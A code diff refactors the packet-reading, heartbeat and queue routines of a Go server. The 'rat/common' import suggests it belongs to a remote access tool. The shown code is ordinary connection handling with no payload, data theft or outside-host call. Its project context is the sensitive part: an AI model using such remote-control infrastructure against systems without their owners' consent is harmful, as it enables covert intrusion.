@@ -3,8 +3,8 @@ package main
 import (
 	"encoding/base64"
 	"encoding/binary"
+	"errors"
 	"fmt"
-	"log"
 	"math/rand"
 	"net"
 	"rat/common"
@@ -124,38 +124,50 @@ func (c *Client) GetPathSep() string {
 	return "/"
 }
 
-func (client *Client) PacketReader() {
+// PacketReader is the routine for continuously reading packets for this client
+// Removes client on any read error, invalid packet header or deserializing error
+func (c *Client) PacketReader() {
 	for {
-		header, err := client.ReadHeader()
+		var packet interface{}
+		var err error
+
+		header, err := c.ReadHeader()
 		fmt.Println("Received header", header)
-
 		if err != nil {
-			fmt.Println(err.Error())
-			remove(client)
-			break
+			goto err
 		}
 
-		packet := GetIncomingPacket(header)
+		packet = GetIncomingPacket(header)
 		if packet == nil {
-			log.Fatal("packet from header was nil", header)
+			err = errors.New("invalid header " + strconv.Itoa(int(header)))
+			goto err
 		}
 
-		e, err := network.Deserialize(client.Reader, packet)
+		packet, err = c.Reader.Deserialize(packet)
 		if err != nil {
-			fmt.Println(err.Error())
-			remove(client)
-			break
+			goto err
 		}
 
-		e.(IncomingPacket).OnReceive(client)
+		err = packet.(IncomingPacket).OnReceive(c)
+		if err != nil {
+			goto err
+		}
+
+		continue
+
+	err:
+		fmt.Println("remove", err.Error())
+		remove(c)
+		break
 	}
 }
 
-func (client *Client) Heartbeat() {
+// Heartbeat pings the client and waits
+func (c *Client) Heartbeat() {
 	for {
-		client.Queue <- &Ping{}
+		c.Queue <- &Ping{}
 
-		for !client.Ping.Received {
+		for !c.Ping.Received {
 			time.Sleep(time.Millisecond)
 		}
 
@@ -163,6 +175,8 @@ func (client *Client) Heartbeat() {
 	}
 }
 
+// PacketQueue polls all packets added to the packet channel
+// Will call Init() on each packet and write it
 func (client *Client) PacketQueue() {
 	for {
 		packet := <-client.Queue
